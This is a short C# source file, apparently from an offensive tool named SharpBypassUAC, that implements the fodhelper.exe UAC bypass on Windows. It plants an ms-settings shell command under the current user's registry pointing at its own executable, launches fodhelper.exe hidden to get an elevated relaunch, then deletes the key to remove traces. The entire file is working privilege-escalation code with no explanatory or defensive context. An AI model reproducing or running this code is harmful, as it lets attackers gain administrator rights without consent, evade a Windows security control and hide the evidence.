using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace SharpBypassUAC;

public class FodHelper
{
	[DllImport("kernel32.dll")]
	public static extern int WinExec(string exeName, int operType);

	public FodHelper()
	{
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\", writable: true);
		registryKey.CreateSubKey("ms-settings\\Shell\\Open\\command");
		RegistryKey? registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command", writable: true);
		registryKey2.SetValue("DelegateExecute", "");
		registryKey2.SetValue("", "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
		registryKey2.Close();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\fodhelper.exe";
		WinExec("cmd.exe /k START " + text, 0);
		Thread.Sleep(1000);
		registryKey.DeleteSubKeyTree("ms-settings");
		Environment.Exit(0);
	}
}
